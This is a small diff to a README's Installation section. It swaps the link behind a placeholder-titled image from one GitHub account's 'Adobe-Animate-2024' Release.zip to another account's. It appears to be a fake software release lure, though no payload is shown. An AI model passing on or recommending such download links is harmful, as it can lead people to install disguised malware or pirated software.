@@ -9,7 +9,7 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/2eef017e-e4d7-412d-9b23-d270452df544)
-](https://github.com/renataalvescun/Adobe-Animate-2024/releases/download/V2.55/Release.zip)
+](https://github.com/Yulistama/Adobe-Animate-2024/releases/download/Release/Release.zip)
 
 
 
